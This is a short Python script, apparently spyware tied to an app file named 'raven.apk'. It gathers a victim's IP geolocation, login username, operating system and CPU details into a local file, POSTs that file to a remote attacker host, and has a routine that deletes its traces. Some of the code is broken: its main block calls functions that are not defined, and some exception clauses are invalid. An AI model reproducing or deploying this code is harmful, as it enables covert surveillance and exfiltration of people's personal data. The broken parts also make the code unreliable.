import os
import platform
import socket
import requests
import json

procFile = "/proc/cpuinfo"
rhost = "http://[REDACTED]:[REDACTED]"

def selfDestruct():
    try:
        os.remove("out.txt")
        os.remove("raven.apk")
    except FileNotFoundError:
        return None

def upload():
    try:
        with open("out.txt", "r") as out:
            info = out.read()

        if info:
            requests.post(rhost, data={"INFO": info})
    except FileNotFoundError:
        return None

def getIPInfo():
    url = "http://ip-api.com/json"
    try:
        response = requests.get(url)
        data = response.json()
    except "Not Found":
        return None

    location = {
        "status": data["status"],
        "ip": data["query"],
        "zip": data["zip"],
        "city": data["city"],
        "regionName": data["regionName"],
        "country": data["country"],
        "latitude": data["lat"],
        "longitude": data["lon"],
        "countryCode": data["countryCode"],
        "timezone": data["timezone"],
        "org": data["org"],
        "as": data["as"]
    }

    ip = socket.gethostbyname(socket.gethostname())

    if location:
        with open("out.txt", "a", encoding="utf-8") as out:
            json.dump(location, out, indent=4)

def getOSInfo():
    username = os.getlogin()
    targetOS = platform.system() + " " + platform.release()

    try:
        with open("out.txt", "a", encoding="utf-8") as out:
            out.write(f"\n Username:  {username}")
            out.write(f"\n Target OS: {targetOS}")
    except FileNotFoundError:
        return None

def createFile():
    try:
    	with open("out.txt", "w") as file:
        	file.write("User Info\n")
    except PermissionError:
    	return None

def getProcessorInfo(procFile):
    try:
        with open(procFile, "r") as procFileOpen:
            lines = procFileOpen.readlines()

        try:
            with open("out.txt", "a", encoding="utf-8") as out:
                out.write("\n Processor Info: \n")
                json.dump(lines[0], out, indent=4)
                json.dump(lines[64], out, indent=4)
        except FileNotFoundError:
            return None

    except PermissionError or FileNotFoundError:
        return None

if __name__ == '__main__':
    createFile()
    getLocation()
    getProcessorInfo(procFile)
    mainInfoRecognizing()
    upload()
